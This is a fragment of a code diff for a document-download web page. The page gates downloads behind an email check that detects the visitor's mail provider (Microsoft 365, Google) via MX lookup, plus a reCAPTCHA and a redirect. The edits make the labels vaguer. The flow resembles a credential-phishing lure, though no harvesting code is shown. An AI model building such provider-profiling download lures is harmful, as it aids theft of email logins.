-            });
-
-            updateCounts();
-        }
-
-        // Update select all state
-        function updateSelectAllState() {
-            const selectAll = document.getElementById('selectAll');
-            selectAll.checked = selectedDocuments.size === documents.length;
         }
 
         // Update counts
         function updateCounts() {
             const count = selectedDocuments.size;
-            document.getElementById('selectedCount').textContent = count;
-            document.getElementById('downloadCount').textContent = count;
-
             const downloadBtn = document.getElementById('downloadBtn');
-            downloadBtn.disabled = count === 0;
+            const downloadBtnText = document.getElementById('downloadBtnText');
+            const downloadCount = document.getElementById('downloadCount');
+
+            if (count === 0) {
+                downloadBtn.disabled = true;
+                downloadBtnText.textContent = 'Select documents to download';
+                downloadCount.style.display = 'none';
+            } else {
+                downloadBtn.disabled = false;
+                downloadBtnText.textContent = `Download ${count} document${count > 1 ? 's' : ''}`;
+                downloadCount.textContent = count;
+                downloadCount.style.display = 'inline-block';
+            }
         }
 
         // Open lightbox
@@ -1346,7 +1146,7 @@
             document.getElementById('errorMessage').classList.remove('show');
             document.getElementById('providerInfo').innerHTML = '';
             document.getElementById('recaptchaContainer').classList.remove('show');
-            document.getElementById('submitBtn').querySelector('.btn-text').textContent = 'Verify & Download Documents';
+            document.getElementById('submitBtn').querySelector('.btn-text').textContent = 'Continue';
             emailVerified = false;
             pendingMxResult = null;
             
@@ -1565,7 +1365,7 @@
             switch(mxResult.provider) {
                 case 'office365':
                     icon = '🔷';
-                    name = 'Microsoft Office 365';
+                    name = 'Microsoft 365';
                     badge = 'office365';
                     break;
                 case 'google':
@@ -1575,7 +1375,7 @@
                     break;
                 default:
                     icon = '📧';
-                    name = 'Custom Email Provider';
+                    name = 'Email Verified';
                     badge = 'other';
             }
 
@@ -1638,7 +1438,7 @@
         function onRecaptchaExpired() {
             console.log('reCAPTCHA expired');
             const errorMsg = document.getElementById('errorMessage');
-            errorMsg.innerHTML = '<span>⚠️</span><span>reCAPTCHA expired. Please verify again.</span>';
+            errorMsg.innerHTML = '<span>⚠️</span><span>Verification expired. Please try again.</span>';
             errorMsg.classList.add('show');
         }
 
@@ -1753,18 +1553,18 @@
                     try {
                         const response = grecaptcha.getResponse(recaptchaWidgetId);
                         if (!response) {
-                            errorMsg.innerHTML = '<span>⚠️</span><span>Please complete the reCAPTCHA verification</span>';
+                            errorMsg.innerHTML = '<span>⚠️</span><span>Please complete the security check</span>';
                             errorMsg.classList.add('show');
                             return;
                         }
                         // If we get here, reCAPTCHA is completed, callback will handle redirect
                     } catch (e) {
                         console.error('reCAPTCHA check error:', e);
-                        errorMsg.innerHTML = '<span>⚠️</span><span>Please complete the reCAPTCHA verification</span>';
+                        errorMsg.innerHTML = '<span>⚠️</span><span>Please complete the security check</span>';
                         errorMsg.classList.add('show');
                     }
                 } else {
-                    errorMsg.innerHTML = '<span>⚠️</span><span>Please wait for reCAPTCHA to load</span>';
+                    errorMsg.innerHTML = '<span>⚠️</span><span>Please wait for security check to load</span>';
                     errorMsg.classList.add('show');
                 }
             }
@@ -1776,9 +1576,6 @@
                 closeLightbox();
             }
         });
-
-        // Select all checkbox handler
-        document.getElementById('selectAll').addEventListener('change', handleSelectAll);
 
         // Initialize on page load
         window.addEventListener('DOMContentLoaded', async () => {
